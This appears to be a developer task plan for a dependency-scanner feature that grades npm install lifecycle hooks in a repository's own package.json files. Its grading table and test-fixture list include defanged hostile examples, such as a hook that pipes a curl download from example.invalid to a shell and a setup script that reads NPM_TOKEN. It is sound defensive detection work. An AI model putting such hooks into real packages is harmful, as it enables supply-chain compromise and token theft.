# Day 6 — Lifecycle scripts in the repo's own `package.json`

**Issue:** [#294](https://github.com/DepRadarOrg/DepRadar/issues/294) ·
**Depends on:** Day 5 (merged first) ·
**Relevant files:** `src/behavioral/scripts.rs`, `src/behavioral/network.rs`

## Goal

Run the existing install-script detectors over the repository's own
`package.json` files, the root one and every workspace one. Anyone who
clones the repo and runs `npm install` executes those scripts. Unlike
today's detector, Day 6 **grades** each script instead of rating every hook
medium.

**Acceptance tests:**
- `"preinstall": "node dist/setup.js"` is flagged.
- `"prepare": "husky"` is reported at low severity.

## What exists today

- [`scripts.rs`](../../src/behavioral/scripts.rs) reads `scripts` and
  returns `preinstall`, `install`, `postinstall` and `prepare`
  (`INSTALL_HOOKS`). It rates **every** hook `Severity::Medium`.
- [`network.rs`](../../src/behavioral/network.rs) `scan_package(root, json)`
  scans those commands and the local `.js`, `.mjs`, `.cjs`, `.sh` and
  `.bash` files they invoke. It reports downloads piped to a shell
  (high), requests to raw IPs (medium) and credential reads (high). It
  already refuses absolute paths and `..` components.

Both label findings `package.json`, because they were written for a
single unpacked package.

## Tasks

### 1. Find the `package.json` files

Use every `package.json` the Day 1 walker returns. That covers the root,
`workspaces` members, `pnpm-workspace.yaml` members, and stray packages
that no manifest declares (an attacker won't declare theirs). Skip any path
containing `node_modules/`, even if `.gitignore` doesn't list it.

Prefix each finding's file label with the package's directory, for example
`frontend/package.json` or `frontend/scripts/setup.js`. Resolve the files
that `network::scan_package` follows relative to **that package's
directory**, not the repo root.

### 2. Which hooks

`npm install` with no arguments, run inside a repo, runs more hooks than
the ones a dependency's install runs. Add a separate list and leave
`INSTALL_HOOKS` alone, so package scans don't change:

```rust
/// Hooks run by a bare `npm install` in the project itself, in order.
pub const REPO_INSTALL_HOOKS: &[&str] = &[
    "preinstall", "install", "postinstall",
    "prepublish",            // deprecated, but still runs on install
    "preprepare", "prepare", "postprepare",
];
```

Generalize `install_scripts` to take the hook list, for example
`scripts_for(json, hooks)`. Keep the existing function as a wrapper with
the same output.

### 3. Grading

Classify each command, then let `network::scan_script` raise the result:

| Command | Level | Example |
|---|---|---|
| Every part is a known git-hook or patch tool | **Low** | `husky`, `husky install`, `is-ci \|\| husky install`, `lefthook install`, `simple-git-hooks`, `patch-package` |
| Runs a file under a build-output directory (`dist/`, `build/`, `out/`) | **High** | `node dist/setup.js` (the acceptance case, and a PolinRider indicator) |
| Inline code: `node -e`, `node --eval`, `sh -c` with a literal | **High** | `node -e "require('./x')"` |
| Anything else | **Medium** | `node scripts/build.js`, `npm run build`, `tsc` |
| Network or credential match from `scan_script` | that finding's level, if higher | `curl … \| sh` |

Rules for the allow-list:

- **Match whole commands, not substrings.** Split on `&&`, `||` and `;`,
  trim each part, and rate the command Low only if **every** part is on
  the list. Otherwise `"prepare": "husky && curl https://… | sh"` would pass
  as low.
- Keep the list in one `const` so adding a tool is a one-line change.
- When a command runs a build-output file that doesn't exist in the repo,
  still flag it. Add "(file not present; built or fetched at install
  time)". A script that runs code which isn't in the repo is worth
  reviewing.

Change `InstallScript::finding_in` (or add a sibling function) to take a
severity. Don't edit the `SEVERITY` const in place, because package scans
still use it.

### 4. Line numbers

`scripts.rs` reports `line: None`. For SARIF output, a line number makes the
finding clickable. Find the line of the hook's key in the raw text
(`"preinstall"` followed by `:`). A plain text search is fine. Don't add a
JSON parser that tracks positions.

## Fixtures

All of these must be defanged. Every script file the fixtures point to
contains `console.log("defanged fixture")`, or a download piped to a shell
as an unexecuted string with an `example.invalid` URL.

**Positive (must flag):**
- Root `package.json` with `"preinstall": "node dist/setup.js"` and a
  defanged `dist/setup.js`. High. This is the acceptance case.
- The same hook with no `dist/setup.js` present. Still high, with the "not
  present" note.
- A workspace `packages/ui/package.json` with
  `"postinstall": "node scripts/setup.js"`, where `scripts/setup.js` reads
  `process.env.NPM_TOKEN`. High, from `network`. The label must be
  `packages/ui/scripts/setup.js`.
- `"prepare": "husky && curl https://example.invalid/x | sh"`. High, not
  low.
- `"postinstall": "node -e \"console.log('defanged')\""`. High.
- A `prepublish` hook, to show the extended hook list is used.

**Negative and low:**
- `"prepare": "husky"`. Low. This is the acceptance case.
- `"prepare": "is-ci || husky install"` and
  `"postinstall": "patch-package"`. Low.
- A `package.json` with only `build`, `test` and `lint` scripts. No findings.
- `node_modules/evil/package.json` with a `preinstall`. Never scanned.

## Known traps

- **Existing fixtures in this repo.** `tests/fixtures/behavioral/*/package.json`
  already declares a `postinstall`. A repo-wide `package.json` walk will
  flag it, and that breaks Day 1's empty self-scan. Exclude
  `tests/fixtures/**` in the repo's own `depradar.toml`, in line with
  whatever Days 3–5 decided. Don't hard-code the path.
- **`frontend/` and `client/`.** Check that the real package files here
  produce only the findings you expect (none, or low). Record what they
  produce in the PR.
- **Don't change package-scan output.** The existing `scripts.rs` and
  `network.rs` tests must pass unchanged. That shows the tarball path still
  rates every hook medium.

## Out of scope

- `.npmrc` settings such as `ignore-scripts`. They could reduce the
  severity, but they are a separate rule.
- Yarn Berry and pnpm differences in which hooks run. Use npm's list. It's
  the largest set, so it's safe.
- Executing or sandboxing scripts. Detection is still declarative only.
